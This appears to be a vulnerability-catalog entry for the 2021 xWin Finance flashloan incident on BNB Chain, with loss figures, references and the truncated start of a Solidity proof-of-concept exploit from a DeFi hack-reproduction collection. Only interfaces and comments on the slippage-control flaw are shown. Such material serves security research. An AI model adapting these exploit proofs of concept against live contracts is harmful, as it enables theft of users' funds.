# [?] xWin Finance - subscription-incentive-mechanism

## Summary
Severity: Unknown
Chain: BNB Chain
Component: xWin
Published: 2021-06-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/xWin_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$300k
References:
- https://peckshield.medium.com/xwin-finance-incident-root-cause-analysis-71d0820e6bc1

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Attacker : https://bscscan.com/address/0xb63f0d8b9aa0c4e68d5630f54bfefc6cf2c2ad19
// Attack Contract : https://bscscan.com/address/0x67d3737c410f4d206012cad5cb41b2e155061945
// Attack Tx : https://bscscan.com/tx/0xba0fa8c150b2408eec9bbbbfe63f9ca63e99f3ff53ac46ee08d691883ac05c1d
// @Analysis
// https://peckshield.medium.com/xwin-finance-incident-root-cause-analysis-71d0820e6bc1
// @Summary
// This incident was due to an invalid slippage control in the protocol, which is exploited in a flashloan to obtain extra xWin rewards.

import "forge-std/Test.sol";
import "./../interface.sol";

struct TradeParams {
    address xFundAddress;
    uint256 amount;
    uint256 priceImpactTolerance;
    uint256 deadline;
    bool returnInBase;
    address referral;
}

interface IBank {
    function flashloan(address receiver, address token, uint256 amount, bytes memory params) external;
}

interface IxWinDefi {
    function Subscribe(
        TradeParams memory _tradeParams
    ) external payable;
    function Redeem(
        TradeParams memory _tradeParams
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-06/xWin_exp.sol_
